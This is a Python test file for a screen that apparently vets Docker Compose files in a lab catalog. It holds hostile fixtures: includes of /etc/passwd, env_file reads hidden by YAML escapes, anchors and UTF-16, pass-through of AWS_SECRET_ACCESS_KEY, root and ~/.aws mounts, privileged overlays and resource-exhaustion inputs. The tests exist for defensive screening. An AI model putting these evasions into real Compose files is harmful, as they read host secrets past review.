    def test_t19_an_extends_of_another_file_blocks_and_one_of_its_own_does_not(self):
        self.assertEqual(self.screen("services:\n  a:\n    extends:\n      file: other.yml\n      service: b\n"), [self.FILES])
        self.assertEqual(self.screen("services:\n  a:\n    extends: {file: ./o.yml, service: b}\n"), [self.FILES])
        self.assertEqual(self.screen('services:\n  a:\n    extends:\n      "file": o.yml\n'), [self.FILES])
        self.assertEqual(self.screen("services:\n  a:\n    extends:\n      service: b\n"), [])
        self.assertEqual(self.screen("services:\n  a:\n    extends: b\n"), [])
        self.assertEqual(self.screen("services:\n  a:\n    extends: *x\n"), [self.FILES])

    def test_t19_both_lines_when_both_hold(self):
        text = "include:\n  - /etc/passwd\nservices:\n  a:\n    env_file: /dev/zero\n"
        self.assertEqual(self.screen(text), [self.INCLUDE, self.FILES])

    def test_t19_spellings_that_hide_a_key_do_not(self):
        for text in ('services:\n  a:\n    "env_\\x66ile": /dev/zero\n', 'services:\n  a:\n    "env_\\u0066ile": /dev/zero\n',
                     'services:\n  a:\n    "env_\\U00000066ile": /dev/zero\n',
                     'services:\n  a:\n    "env_\\\n    file": /dev/zero\n', 'services:\n  a:\n    "env_file" : /dev/zero\n',
                     "services:\n  a:\n    'env_file': /dev/zero\n", "services:\n  a:\n    env_file : /dev/zero\n",
                     "services:\n  a:\n    env_file: [\n  \"/dev/zero\"\n]\n",
                     'services:\n  a:\n    env_file: [ "]",\n      "/dev/zero" ]\n',
                     "services: {a: {env_file: /dev/zero}}\n", "services: {a: {env_file: [/dev/zero]}}\n",
                     "x: &z /dev/zero\nservices:\n  a:\n    env_file: *z\n", "? env_file\n: /dev/zero\n",
                     "services:\n  a:\n    env_file: &p /dev/zero\n", "services:\n  a:\n    env_file: !!str /dev/zero\n",
                     "services:\n  a:\n    env_file: |\n      /dev/zero\n", "services:\n  a:\n    env_file: \"/dev/zero\" # a comment\n",
                     "services:\n  a:\n    &anchor env_file: /dev/zero\n", "services:\n  a:\n    !!str env_file: /dev/zero\n",
                     "\ufeffservices:\n  a:\n    env_file: /dev/zero\n", "services:\r\n  a:\r\n    env_file: /dev/zero\r\n"):
            with self.subTest(text=text):
                self.assertEqual(self.screen(text), [self.FILES])
                self.assertEqual(self.screen(text, follow=True), [self.FILES])
        self.assertEqual(self.screen("x: &z /etc/passwd\ninclude:\n  - *z\n"), [self.INCLUDE])

    def test_t19_what_a_line_by_line_reading_misses_is_refused(self):
        """The spellings above Compose reads (HIDDEN), and the odd ones it does not (ODD), wherever they are, with the file
        outside the folder named plainly or not at all."""
        for name, template in HIDDEN.items():
            text = template
            for place, written in PLACES.items():
                text = text.replace(place, written)
            for follow in (False, True):
                with self.subTest(spelling=name, follow=follow):
                    self.assertTrue(self.screen(text, follow=follow), repr(text))
        for text in ODD:
            with self.subTest(text=text):
                self.assertTrue(self.screen(text, follow=True), repr(text))

    def test_t19_a_key_with_every_spelling_in_every_place_is_refused(self):
        """The cross product of how a key is spelled, what follows it and where it sits, run against the bad value."""
        spellings = ("{k}", '"{k}"', "'{k}'", "&a {k}", "!!str {k}", '"{k0}\\x{x}{k1}"', '"{k0}\\u00{x}{k1}"', "{k} ", "{k}\t")
        values = ("/outside/x", '"/outside/x"', "'/outside/x'", "[/outside/x]", "\n      - /outside/x", "\n      - path: /outside/x",
                  "[a, '/outside/x']", "!!str /outside/x", "&p /outside/x", "/outside/x  # note 'x \"y")
        places = ("services:\n  a:\n    image: busybox\n    {entry}\n", "services: {{a: {{image: busybox, {flow}}}}}\n",
                  "services:\n  a: {{\n    image: busybox,\n    {flow}\n  }}\n", "x-m: &m\n  {entry}\nservices:\n  a:\n    <<: *m\n",
                  "services:\n  a:\n    image: busybox\n    hostname: it's\n    labels: {{a: \"x #\", b: 'q # r'}}\n    {entry}\n")
        made = 0
        for key in ("env_file", "label_file"):
            for spelling in spellings:
                k = spelling.format(k=key, k0=key[:3], k1=key[4:], x=format(ord(key[3]), "02x"))
                for value in values:
                    colon = ":" if "\n" in value else ": "
                    entry, flow = f"{k}{colon}{value}", f"{k}{colon}{value}".replace("\n      ", " ")
                    for place in places:
                        text = place.format(entry=entry, flow=flow)
                        made += 1
                        self.assertEqual(self.screen(text, follow=True), [self.FILES], repr(text))
        self.assertGreater(made, 800)
        for spelling in ("{k}", '"{k}"', "'{k}'", "&a {k}", "!!str {k}", '"inc\\x6cude"'):
            for value in ("/outside/x", '"/outside/x"', "[/outside/x]", "\n  - /outside/x", "\n  - path: /outside/x",
                          "\n  - {path: /outside/x}", "[a, '/outside/x']"):
                head, space = spelling.format(k="include"), "" if value.startswith("\n") else " "
                text = f"{head}:{space}{value}\nservices: {{}}\n"
                self.assertEqual(self.screen(text), [self.INCLUDE], repr(text))

    def test_t19_a_value_that_hides_a_later_item_is_read_both_ways(self):
        """In a block `,[]{}` are the characters of a word, in a flow collection they end it, and the text after a key does not
        say which it is in: so a value is read both ways, and a file is held to what either finds."""
        for text in ("include:\n  - a, 'b\n  - /outside/inc.yml\n  - c'\n", "include:\n  - g]h\n  - /outside/inc.yml\n",
                     "include:\n  - a[b\n  - /outside/inc.yml\n", "include:\n  - {x\n  - /outside/inc.yml\n",
                     "include:\n  - a #\n  - /outside/inc.yml\n", "include:\n  - it's\n  - /outside/inc.yml\n",
                     "include:\n  - 'a''b'\n  - /outside/inc.yml\n", 'include:\n  - "a\\"b"\n  - /outside/inc.yml\n',
                     "include: [a 'q, [ x 'r, y ],\n  /outside/inc.yml]\n", "include: [\"]\",\n /outside/inc.yml]\n",
                     "include: ['a\n  b', /outside/inc.yml]\n", "include: [a, # note ]\n  /outside/inc.yml]\n"):
            with self.subTest(text=text):
                self.assertEqual(self.screen(text), [self.INCLUDE])
        self.assertEqual(self.screen("include:\n  - a,b\n  - 'c,d'\n  - e]f\n  - g[h\n"), [self.INCLUDE])   # a collection never closed

    def test_t19_a_flow_collection_that_never_ends_is_not_read(self):
        self.assertEqual(self.screen("services:\n  a:\n    env_file: [\n" + "  ok.env,\n" * 500 + "]\n"), [self.FILES])
        self.assertEqual(self.screen("services:\n  a:\n    env_file: [ok.env\n", follow=True), [self.FILES])
        self.assertEqual(self.screen("include: [\n" + "  ../ok.yml,\n" * 500 + "]\n"), [self.INCLUDE])
        self.assertEqual(self.screen("include: [\n" + "  ../ok.yml,\n" * 50 + "]\n"), [])
        self.assertEqual(self.screen("include: '\n" + "a\n" * 500 + "'\n"), [self.INCLUDE])
        self.assertEqual(self.screen("include:\n  - |\n    ../ok.yml\n"), [self.INCLUDE])

    def test_t19_a_file_over_one_megabyte_is_refused_whatever_it_is(self):
        big = "x: " + "a" * trust.MAX_FILE + "\n"
        self.assertEqual(self.screen(big), [self.FILES])
        self.assertEqual(self.screen(big, ".lab/catalogs/ns/playgrounds/x/seed/apim/apis/big.json"), [self.FILES])
        self.assertEqual(self.screen("x: " + "a" * 1000 + "\n"), [])

    def test_t19_a_file_that_is_not_utf_8_is_refused(self):
        """Compose reads UTF-16 as well, and what is left of it when it is read as UTF-8 shows no key: a NUL, or the
        replacement character, or a lone surrogate."""
        text = "services:\n  a:\n    image: busybox\n    env_file: /outside/secret.env\n"
        for bytes_ in (text.encode("utf-16"), text.encode("utf-16-le"), text.encode("utf-16-be")):
            for errors in ("replace", "surrogateescape"):
                with self.subTest(errors=errors):
                    self.assertEqual(self.screen(bytes_.decode("utf-8", errors)), [self.FILES])
        self.assertEqual(self.screen("services: {}\n# \x00\n"), [self.FILES])
        self.assertEqual(self.screen("x: \ufffd\n"), [self.FILES])

    def test_t19_seed_data_and_other_files_are_only_held_to_the_size(self):
        text = "include:\n  - /etc/passwd\nenv_file: /dev/zero\n"
        for file in (".lab/catalogs/ns/playgrounds/x/seed/apim/apis/a.yaml", ".lab/catalogs/ns/playgrounds/x/seed/am/a.yml",
                     ".lab/catalogs/ns/playgrounds/x/guide.md", ".lab/catalogs/ns/addons/x/otel.json",
                     ".lab/catalogs/ns/addons/x/seed/a/b.yml", ".lab/catalogs/ns/playgrounds/seed/seed/a.yml"):
            with self.subTest(file=file):
                self.assertEqual(self.screen(text, file), [])

    def test_t19_a_unit_called_seed_is_a_unit(self):
        """The exemption is for a unit's own folder of seed data, not for any path that has the word in it."""
        text = "services:\n  a:\n    env_file: /dev/zero\ninclude:\n  - /etc/passwd\n"
        for file in (".lab/catalogs/ns/addons/seed/compose.yml", ".lab/catalogs/ns/playgrounds/seed/compose.yml",
                     ".lab/catalogs/seed/addons/a/compose.yml", ".lab/catalogs/seed/playgrounds/a/compose.yml",
                     ".lab/catalogs/seed/setups/a.yml", ".lab/catalogs/ns/setups/seed.yml", ".lab/catalogs/ns/addons/a/seed.yml",
                     ".lab/catalogs/local/addons/seed/compose.yml"):
            with self.subTest(file=file):
                self.assertEqual(self.screen(text, file), [self.INCLUDE, self.FILES])

    def test_t19_a_text_that_is_not_text_is_clean_and_never_raises(self):
        for text in (None, 0, b"x", [], {}):
            self.assertEqual(self.screen(text), [])
        for file in (None, 0, "", "compose.yml"):
            self.assertEqual(trust.prescreen("a: 1\n", file), [])

    def test_t19_a_hostile_file_costs_little(self):
        """Every shape that makes a reader of text read more than the file is long: keys by the thousand on one line, brackets and
        quotes that never close, a list of a hundred thousand dashes. Each is more than the screen will read (SCREEN_CHARS)."""
        n = 6000
        attacks = ("services:\n  a:\n    env_file:\n" + "- " * 100000 + "\n", "include:\n" + "  - ../a.yml\n" * 30000,
                   "".join(" " * (number % 500) + "env_file: ok.env\n" for number in range(2000)),
                   "a: " + "[" * 100000 + "\n", "a: " + "\\x41" * 50000 + "\n", "env_file: " + "a" * 400000 + "\n",
                   "services:\n" + "  a:\n    env_file: [\n" * 2000,
                   "x: {" + ", ".join("env_file: a" for _ in range(n)) + "}\n", "x: {" + ", ".join("include: a" for _ in range(n * 5)) + "}\n",
                   "x: {" + ", ".join("extends: a" for _ in range(n * 5)) + "}\n", "include: " + "- a, " * 80000,
                   "include: " + "'a " * 80000, "include: '\n" + "a\n" * 50000, "x: " + "*a : " * 50000, "x: " + ", ? " * 50000,
                   "x: " + " " * 400000 + "include: a\n", "include: " + "a: " * 50000,
                   "".join(" " * (number % 400) + "include:\n" for number in range(3000)),
                   ("include:\n" + "  - a.yml\n" * 200) * 150, "include: " + "[" * 50000 + "]" * 50000)
        for text in attacks:
            started = time.process_time()
            self.screen(text, follow=True)
            self.assertLess(time.process_time() - started, 3.0, text[:60])
        for text in attacks[:3]:
            started = time.process_time()
            self.screen(text)
            self.assertLess(time.process_time() - started, 3.0, text[:60])

    def test_t19_the_work_is_bounded_by_the_characters_read(self):
        """A file whose keys have more to read than SCREEN_CHARS is refused, not read for an hour."""
        many = "include:\n" + "  - ../ok.yml\n" * 30 + "x: 1\n"
        self.assertEqual(self.screen(many * 100), [])
        self.assertEqual(self.screen(many * 2000), [self.FILES])
        self.assertEqual(self.screen("x: {" + ", ".join("include: ../a.yml" for _ in range(40000)) + "}\n"), [self.FILES])

    def test_the_hostile_units_the_screen_refuses_are_blocked_without_asking_compose(self):
        """Never sent to Compose: the screen refuses them, and a run with Compose and every command patched to raise is
        the proof."""
        def raising(*args, **how):
            raise AssertionError("Compose was asked")
        with tempfile.TemporaryDirectory() as root, mock.patch.object(compose, "run", raising), \
                mock.patch.object(subprocess, "run", raising), mock.patch.object(subprocess, "Popen", raising):
            one = regen.judged("t19-absolute-include", root)
            two = regen.judged("t19-env-file-dev-zero", root)
            three = regen.judged("seed", root)
        self.assertEqual((one["state"], one["reasons"]), ("blocked", [self.INCLUDE]))
        self.assertEqual((two["state"], two["reasons"]), ("blocked", [self.FILES]))
        self.assertEqual((three["state"], three["reasons"]), ("blocked", [self.FILES]))
        self.assertTrue(regen.load("t19-absolute-include")["never_compose"])

    def test_compose_reads_what_the_screen_refuses(self):
        """The proof that the spellings are real: Compose, asked about each, reads a file outside the folder, and the screen had
        refused it. Skipped, and said, without Compose 5."""
        installed = regen.version()
        if not installed.startswith("5."):
            reason = f"skipped: the spellings were run with Compose 5, {'this is ' + installed if installed else 'none is installed'}"
            print(reason, file=sys.stderr)
            self.skipTest(reason)
        with tempfile.TemporaryDirectory() as holder:
            base = Path(holder).resolve()
            (base / "outside").mkdir()
            (base / "outside" / "secret.env").write_text("SECRETVALUE=topsecret\n", encoding="utf-8")
            (base / "outside" / "inc.yml").write_text("services:\n  injected:\n    image: busybox\n", encoding="utf-8")
            (base / "outside" / "base.yml").write_text("services:\n  b:\n    image: busybox\n    environment:\n"
                                                       "      MARK: extended-marker\n", encoding="utf-8")
            folder = base / "project" / ".lab" / "catalogs" / "ns" / "addons" / "x"
            folder.mkdir(parents=True)
            sample = ("explicit-key-alone", "alias-key", "comment-then-nel", "comment-then-cr", "quote-in-a-word", "binary-key",
                      "binary-percent", "tag-directive", "escaped", "include-explicit", "include-binary", "include-comment-then-nel",
                      "extends-binary")
            for name in sample + ("plain",):
                text = HIDDEN.get(name, "services:\n  a:\n    image: busybox\n    env_file: @SECRET@\n")
                for place, real in (("@SECRET@", base / "outside" / "secret.env"), ("@INC@", base / "outside" / "inc.yml"),
                                    ("@BASE@", base / "outside" / "base.yml")):
                    text = text.replace(place, str(real))
                (folder / "compose.yml").write_bytes(text.encode("utf-8"))
                done = subprocess.run(["docker", "compose", "-f", str(folder / "compose.yml"), "config", "--format", "json",
                                       "--no-consistency"], cwd=base / "project", env=regen._environment(), capture_output=True,
                                      text=True, timeout=60, stdin=subprocess.DEVNULL)
                with self.subTest(spelling=name):
                    self.assertEqual(done.returncode, 0, done.stderr)
                    self.assertTrue(any(mark in done.stdout for mark in ("topsecret", '"injected"', "extended-marker")))
                    self.assertTrue(self.screen(text.replace(str(base / "outside"), "/outside")), name)


class Settings(Golden):
    """T20."""

    def test_t20_a_setting_that_is_not_its_own_blocks(self):
        verdict = self.judge("t20-foreign-setting")
        self.assertEqual(verdict["reasons"], [line("T20", names="SOME_OTHER_TOOL_TOKEN")])

    def test_t20_a_setting_the_catalog_declares_does_not(self):
        self.ok("t20-declared-setting")
        self.assertEqual(self.judge("t20-declared-setting", shared_settings=[])["reasons"], [line("T20", names="FIXTURE_SHARED_TOKEN")])

    def test_t20_the_names_a_unit_may_read(self):
        for name, ok in (("HOSTILE_ANYTHING", True), ("HOSTILE_", True), ("X_VERSION", True), ("X_REGISTRY", True),
                         ("X_PULL_POLICY", True), ("INTERNAL_API_PASSWORD", True), ("GRAVITEE_LICENSE", True),
                         ("FIXTURE_SHARED_TOKEN", True), ("HOME", False), ("PATH", False), ("AWS_SECRET_ACCESS_KEY", False),
                         ("HOSTILEX", False), ("hostile_x", False), ("VERSION", False), ("X_VERSIONS", False)):
            def edit(arguments, name=name):
                arguments["unit"]["references"] = [name]
            with self.subTest(name=name):
                self.assertEqual("T20" not in self.changed(CLEAN, edit)["codes"], ok)

    def test_t20_the_unit_and_what_it_brings_name_settings_of_a_listed_catalog_only(self):
        def edit(arguments):
            arguments["unit"]["references"] = ["T20_DEMO_X", "KAFKA_X", "OTHER_X"]
            arguments["context"]["closure_names"] = ["kafka"]
        arguments = self.args(CLEAN, listed=True)
        edit(arguments)
        arguments["unit"]["id"] = "@hostile/t20-demo"
        verdict = trust.judge(**arguments)
        self.assertEqual(verdict["reasons"], [line("T20", names="OTHER_X")])
        arguments = self.args(CLEAN)
        edit(arguments)
        arguments["unit"]["id"] = "@hostile/t20-demo"
        self.assertEqual(trust.judge(**arguments)["reasons"], [line("T20", names="KAFKA_X, OTHER_X, T20_DEMO_X")])

    def test_t20_a_namespace_prefix_writes_dashes_as_underscores(self):
        for ns, name, ok in (("acme-hub", "ACME_HUB_X", True), ("acme-hub", "ACME_X", False), ("hostile", "HOSTILE_X", True)):
            def edit(arguments, ns=ns, name=name):
                arguments["unit"]["references"] = [name]
                arguments["context"]["ns"] = ns
            with self.subTest(ns=ns, name=name):
                self.assertEqual("T20" not in self.changed(CLEAN, edit)["codes"], ok)

    def test_t20_a_variable_passed_through_from_the_shell_is_read(self):
        self.assertEqual(self.judge("t20-passthrough")["reasons"], [line("T20", names="AWS_SECRET_ACCESS_KEY")])

    def test_t20_a_seed_reads_the_environment_of_its_own_container(self):
        self.ok(PLAYGROUND)
        self.assertEqual(self.judge("n02-seed-reads-foreign-setting")["reasons"], [line("T20", names="SOME_OTHER_TOOL_TOKEN")])
        def edit(arguments):
            arguments["unit"]["seed_references"] = ["HOSTILE_DEMO_PASSWORD", "APIM_GATEWAY_URL", "NOT_DEFINED"]
        self.assertEqual(self.changed(PLAYGROUND, edit)["reasons"], [line("T20", names="NOT_DEFINED")])

    def test_f1_a_unit_that_writes_empty_values_is_not_blocked_and_one_that_passes_a_name_through_is(self):
        def edit(arguments, text, **environment):
            raw = {"services": {"a": {"environment": environment}}}
            arguments["unit"]["references"] = trust.reads([f"services:\n  a:\n    environment:\n{text}"], raw)
        arguments = self.args(CLEAN)
        edit(arguments, '      ELSEWHERE_USER: ""\n      ELSEWHERE_PASS: ""\n', ELSEWHERE_USER="", ELSEWHERE_PASS="")
        self.assertEqual(trust.judge(**arguments)["reasons"], [])
        arguments = self.args(CLEAN)
        edit(arguments, '      ELSEWHERE_USER: ""\n      - ELSEWHERE_PASS\n', ELSEWHERE_USER="", ELSEWHERE_PASS="")
        self.assertEqual(trust.judge(**arguments)["reasons"], [line("T20", names="ELSEWHERE_PASS")])

    def test_f2_a_seed_that_reads_what_the_seeder_gives_it_is_not_blocked(self):
        def edit(arguments):
            arguments["unit"]["seed_references"] = trust.seed_reads(["id: ${ENV_ID}\nname: ${ENV_NAME}\nuser: ${HOSTILE_DEMO_PASSWORD}\n"])
        self.assertEqual(self.changed(PLAYGROUND, edit)["reasons"], [])

        def foreign(arguments):
            arguments["unit"]["seed_references"] = trust.seed_reads(["id: ${ENV_ID}\nuser: ${ELSEWHERE_USER}\n"])
        self.assertEqual(self.changed(PLAYGROUND, foreign)["reasons"], [line("T20", names="ELSEWHERE_USER")])

    def test_t20_what_is_really_set_comes_first_and_only_three_are_spelled(self):
        def edit(arguments):
            arguments["unit"]["references"] = ["A_ONE", "B_TWO", "C_THREE", "D_FOUR", "E_FIVE"]
            arguments["env"] = {"E_FIVE", "D_FOUR"}
        self.assertEqual(self.changed(CLEAN, edit)["reasons"], [line("T20", names="D_FOUR, E_FIVE, A_ONE and 2 more")])

    def test_t20_the_license_is_allowed_and_said(self):
        def edit(arguments):
            arguments["unit"]["references"] = ["GRAVITEE_LICENSE"]
        verdict = self.changed(CLEAN, edit)
        self.assertEqual((verdict["state"], verdict["surface"]["reads"]), ("ok", ["license"]))

    def test_t20_a_unit_of_this_machine_reads_what_it_wants(self):
        def edit(arguments):
            arguments["unit"]["references"] = ["HOME"]
        verdict = self.changed(CLEAN, edit, local=True)
        self.assertEqual((verdict["state"], verdict["reasons"]), ("ok", []))


class Overlays(Golden):
    """T22."""

    def test_t22_changing_more_than_settings_blocks(self):
        self.assertEqual(self.judge("t22-overlay-too-much")["reasons"], [line("T22", label="Gateway")])

    def test_t22_adding_settings_does_not(self):
        verdict = self.ok("p-overlay-ok")
        self.assertEqual(verdict["surface"]["core"], [{"service": "apim-gateway", "label": "Gateway",
                                                       "keys": ["depends_on", "environment", "extra_hosts", "labels", "ports", "volumes"]}])

    def test_t22_a_named_volume_the_unit_declares_itself_is_no_more_than_a_bind_of_its_folder(self):
        """Acme Bakery keeps the gateway's models in a volume of its own. T14 vets the declaration (not external, a local
        driver, a name of its own), T21 the name; the content is the unit's either way."""
        verdict = self.ok("p-overlay-volume")
        self.assertEqual(verdict["surface"]["core"], [{"service": "apim-gateway", "label": "Gateway", "keys": ["volumes"]}])
        self.assertEqual(self.judge("p-overlay-volume", listed=True)["reasons"], [])

    def test_t22_a_volume_of_the_platform_is_not_the_units_to_mount(self):
        self.assertEqual(self.judge("t22-overlay-core-volume")["reasons"], [line("T22", label="Gateway")])
        def again(arguments):
            arguments["unit_config"]["volumes"] = {"data-mongo": {"name": "gravitee_data-mongo", "labels": {"x": "y"}}}
        self.assertEqual(self.changed("t22-overlay-core-volume", again)["reasons"], [line("T22", label="Gateway")])

    def test_t22_a_volume_it_declares_is_still_vetted_by_t14(self):
        for edit_ in ({"external": True}, {"driver": "nfs"}, {"driver_opts": {"type": "none", "o": "bind", "device": "/etc"}}):
            def edit(arguments, edit_=edit_):
                arguments["unit_config"]["volumes"]["data-hostile-models"].update(edit_)
            with self.subTest(edit=edit_):
                self.assertEqual(self.changed("p-overlay-volume", edit)["reasons"], [line("T14")])
        def elsewhere(arguments):
            arguments["overlaid"] = {"apim-gateway": {"volumes": [{"type": "volume", "source": "data-other", "target": "/x"}]}}
        self.assertEqual(self.changed("p-overlay-volume", elsewhere)["reasons"], [line("T22", label="Gateway")])

    def test_t22_every_key_that_is_not_a_setting_blocks(self):
        for key, value in (("command", ["x"]), ("image", "evil"), ("entrypoint", ["x"]), ("privileged", True), ("networks", {"x": None}),
                           ("user", "root"), ("restart", "always"), ("build", "."), ("cap_add", ["ALL"]), ("healthcheck", {"test": ["NONE"]})):
            def edit(arguments, key=key, value=value):
                arguments["overlaid"] = {"apim-gateway": {key: value}}
            with self.subTest(key=key):
                self.assertEqual(self.changed("p-overlay-ok", edit)["reasons"][-1:], [line("T22", label="Gateway")])

    def test_t22_a_volume_must_be_a_read_only_bind_of_its_own_folder(self):
        unit = str(self.root / ".lab/catalogs/hostile/addons/p-overlay-ok")
        for volume, state in (({"type": "bind", "source": unit + "/x.yml", "target": "/x", "read_only": True}, "ok"),
                              ({"type": "bind", "source": unit + "/x.yml", "target": "/x"}, "blocked"),
                              ({"type": "bind", "source": "/", "target": "/host", "read_only": True}, "blocked"),
                              ({"type": "volume", "source": "named", "target": "/x"}, "blocked"),
                              ({"type": "volume", "source": "${HOME}/.aws", "target": "/x", "read_only": True}, "blocked"),
                              ({"type": "bind", "source": str(self.root / "plugins/apim"), "target": "/x", "read_only": True}, "blocked"),
                              ("./x.yml:/x:ro", "blocked"), ("x.yml:/x:ro", "blocked"), ("/etc:/x:ro", "blocked"), ("named:/x", "blocked")):
            def edit(arguments, volume=volume):
                arguments["overlaid"] = {"apim-gateway": {"volumes": [volume]}}
            with self.subTest(volume=volume):
                self.assertEqual(self.changed("p-overlay-ok", edit)["state"], state)

    def test_t22_a_port_must_be_loopback(self):
        for port, state in (({"host_ip": "127.0.0.1", "target": 1, "published": "2"}, "ok"), ({"target": 1, "published": "2"}, "blocked"),
                            ({"host_ip": "0.0.0.0", "target": 1}, "blocked"), ("127.0.0.1:2:1", "ok"), ("2:1", "blocked")):
            def edit(arguments, port=port):
                arguments["overlaid"] = {"apim-gateway": {"ports": [port]}}
            with self.subTest(port=port):
                self.assertEqual(self.changed("p-overlay-ok", edit)["state"], state)

    def test_t22_an_overlay_the_caller_did_not_find_is_found_in_the_configuration(self):
        """The resolved configuration of the unit against the core's: judged apart from what the caller says it overlays."""
        def hidden(edit):
            def change(arguments):
                arguments["overlaid"] = {}
                edit(arguments["unit_config"]["services"]["apim-gateway"], arguments)
            return change
        for name, edit in (("image", lambda service, arguments: service.update(image="evil")),
                           ("command", lambda service, arguments: service.update(command=["sh"])),
                           ("privileged", lambda service, arguments: service.update(privileged=True)),
                           ("a volume", lambda service, arguments: service["volumes"].append(
                               {"type": "bind", "source": "/", "target": "/host", "read_only": True})),
                           ("a port", lambda service, arguments: service["ports"].append({"target": 1, "published": "9"})),
                           ("a key of the core removed", lambda service, arguments: service.pop("healthcheck", None) or service.pop("image"))):
            with self.subTest(change=name):
                self.assertEqual(self.changed("p-overlay-ok", hidden(edit))["reasons"], [line("T22", label="Gateway")])
        self.assertEqual(self.changed("p-overlay-ok", hidden(lambda service, arguments: None))["state"], "ok")

    def test_t22_a_unit_that_brings_another_may_see_its_settings_but_not_widen_them(self):
        sibling = str(self.root / ".lab/catalogs/hostile/addons/sibling")
        def edit(arguments, read_only=True):
            arguments["roots"]["closure"].append(sibling)
            arguments["unit_config"]["services"]["apim-gateway"]["volumes"].append(
                {"type": "bind", "source": sibling + "/certs/x.pem", "target": "/x", "read_only": read_only})
            arguments["overlaid"] = {}
        self.assertEqual(self.changed("p-overlay-ok", edit)["reasons"], [])
        self.assertEqual(self.changed("p-overlay-ok", lambda arguments: edit(arguments, False))["reasons"], [line("T22", label="Gateway")])
        def own(arguments):
            edit(arguments)
            arguments["overlaid"] = {"apim-gateway": {"volumes": [
                {"type": "bind", "source": sibling + "/certs/x.pem", "target": "/x", "read_only": True}]}}
        self.assertEqual(self.changed("p-overlay-ok", own)["reasons"], [line("T22", label="Gateway")])

    def test_t22_is_a_rule_of_the_lab_not_of_this_machine_whatever_the_catalog_may(self):
        self.assertEqual(self.judge("t22-overlay-too-much", listed=True)["reasons"], [line("T22", label="Gateway")])
        self.assertEqual(self.declared("t22-overlay-too-much", listed=True)["reasons"], [line("T22", label="Gateway")])

    def test_the_overlays_of_a_unit_are_what_its_own_file_adds(self):
        core = {"apim-gateway", "redis"}
        raw = {"services": {"apim-gateway": {"environment": {"A": "1"}, "networks": {"default": None},
                                             "volumes": [{"type": "bind", "source": "/x", "target": "/y"}], "ports": []},
                            "mine": {"image": "x"}, "redis": {"networks": {"default": None}},
                            "other": {"environment": {"A": "1", "B": "2"}, "command": ["x"]}}}
        included = [{"services": {"other": {"environment": {"A": "1"}, "command": ["x"]}}}]
        self.assertEqual(trust.overlays(raw, core, included), {
            "apim-gateway": {"environment": {"A": "1"}, "volumes": [{"type": "bind", "source": "/x", "target": "/y"}]},
            "other": {"environment": {"B": "2"}}})
        self.assertEqual(trust.overlays({"services": {"redis": {"networks": ["default"]}}}, core), {})
        self.assertEqual(trust.overlays(None, core), {})
        self.assertEqual(trust.overlays({"services": {"redis": "x"}}, core), {})


class Includes(Golden):
    """T23 to T27."""

    def test_t23_an_include_outside_the_allowed_set_blocks(self):
        verdict = self.judge("t23-include-outside")
        self.assertIn(line("T23"), verdict["reasons"])
        self.assertEqual(self.judge("t23-includes-a-setup")["reasons"], [line("T23")])

    def test_t23_an_include_of_its_own_catalog_or_a_declared_one_does_not(self):
        self.silent("p-pair", "T23")
        self.silent("h-sibling-bind-ro", "T23")
        self.silent("t24-public-needs-private", "T23")
        self.assertIn("T23", self.judge("t24-public-needs-private", requires=[])["codes"])

    def test_t23_every_target_that_is_not_an_allowed_unit(self):
        for target in (None, "", "addons/x/compose.yml", ".lab/catalogs/local/addons/x/compose.yml", ".lab/catalogs/other/addons/x/compose.yml",
                       ".lab/catalogs/.stage-hostile/addons/x/compose.yml", ".lab/catalogs/hostile/playgrounds/x/compose.yml",
                       ".lab/catalogs/hostile/addons/x/certs/compose.yml", ".lab/catalogs/hostile/addons/x/compose.yml/../y",
                       ".lab/catalogs/hostile/setups/x.yml", 7):
            def edit(arguments, target=target):
                arguments["unit"]["includes"] = [target]
            with self.subTest(target=target):
                self.assertIn("T23", self.changed("h-secrets-rw", edit)["codes"])
        def fine(arguments):
            arguments["unit"]["includes"] = [".lab/catalogs/hostile/addons/x/compose.yml"]
        self.assertNotIn("T23", self.changed("h-secrets-rw", fine)["codes"])

    def test_t23_a_playground_may_include_a_setup_and_an_add_on_does_not(self):
        def edit(arguments):
            arguments["unit"]["includes"] = [".lab/catalogs/hostile/setups/x.yml"]
        self.assertNotIn("T23", self.changed("p-terminal", edit)["codes"])
        self.assertIn("T23", self.changed("h-secrets-rw", edit)["codes"])
        def playground(arguments):
            arguments["unit"]["includes"] = [".lab/catalogs/hostile/playgrounds/x/compose.yml"]
        self.assertIn("T23", self.changed("p-terminal", playground)["codes"])

    def test_t23_a_unit_of_this_machine_may_include_anything(self):
        def edit(arguments):
            arguments["unit"]["includes"] = ["../../x", ".lab/catalogs/local/addons/x/compose.yml"]
        self.assertEqual(self.changed("h-secrets-rw", edit, local=True)["state"], "ok")

    def test_t24_a_public_unit_may_not_depend_on_a_private_one(self):
        verdict = regen.pipeline(self.root)["t24-public-needs-private"]
        self.assertEqual(verdict["reasons"], [line("T24")])
        self.assertEqual(verdict["codes"], ["T24"])
        self.assertEqual(self.judge("t24-public-needs-private")["state"], "ok")

    def test_t24_a_private_unit_may_depend_on_both(self):
        self.assertFalse(resolve.audience_blocked(resolve.rank("private"), resolve.rank("private")))
        self.assertFalse(resolve.audience_blocked(resolve.rank("private"), resolve.rank("public")))
        self.assertFalse(resolve.audience_blocked(resolve.rank("public"), resolve.rank("public")))
        self.assertTrue(resolve.audience_blocked(resolve.rank("public"), resolve.rank("private")))

    def test_t25_a_unit_that_brings_a_blocked_one_is_blocked(self):
        verdict = regen.pipeline(self.root)["t25-needs-blocked"]
        self.assertEqual(verdict["reasons"], [line("T25", name="Writable bind")])
        self.assertEqual(verdict["closure"], [("addon", "t25-needs-blocked"), ("addon", "t12-bind-writable")])
        self.assertEqual(self.judge("t25-needs-blocked")["state"], "ok")

    def test_t25_a_unit_that_brings_a_good_one_is_not(self):
        verdict = regen.pipeline(self.root)["h-sibling-bind-ro"]
        self.assertEqual((verdict["state"], verdict["reasons"]), ("ok", []))

    def test_t25_a_personal_unit_that_brings_a_blocked_one_cannot_start_either(self):
        own = self.judge(CLEAN, local=True)
        self.assertEqual(own["state"], "ok")
        combined = trust.combine([own, self.judge("t12-bind-writable")])
        self.assertEqual((combined["state"], combined["reasons"]), ("blocked", [line("T25", name="Writable bind")]))

    def test_t26_a_unit_written_for_a_newer_lab_blocks(self):
        self.assertEqual(self.judge("t26-newer-lab")["reasons"], [line("T26", 0, level=99, min=regen.LEVELS[1], max=regen.LEVELS[0])])
        self.assertEqual(self.judge("t26-newer-lab", contract=99)["state"], "ok")

    def test_t26_a_unit_written_for_an_older_lab_blocks(self):
        def edit(arguments):
            arguments["context"].update(level=1, contract=5, contract_min=3)
        self.assertEqual(self.changed(CLEAN, edit)["reasons"], [line("T26", 1, level=1)])
